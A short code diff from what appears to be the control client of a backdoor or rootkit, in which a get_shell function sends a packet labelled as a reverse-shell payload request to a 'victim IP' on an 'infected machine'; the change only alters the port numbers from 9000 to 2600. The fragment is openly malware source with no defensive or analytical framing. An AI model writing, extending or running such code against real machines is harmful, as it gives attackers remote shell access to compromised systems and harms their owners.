@@ -67,7 +67,7 @@ void get_shell(char* argv){
     char* local_ip = getLocalIpAddress();
     printf("["KBLU"INFO"RESET"]""Victim IP selected: %s\n", argv);
     check_ip_address_format(argv);
-    packet_t packet = build_standard_packet(9000, 9000, local_ip, argv, 2048, "2600_PAYLOAD_GET_REVERSE_SHELL");
+    packet_t packet = build_standard_packet(2600, 2600, local_ip, argv, 2048, "2600_PAYLOAD_GET_REVERSE_SHELL");
     printf("["KBLU"INFO"RESET"]""Sending malicious packet to infected machine...\n");
 
     pid_t pid;
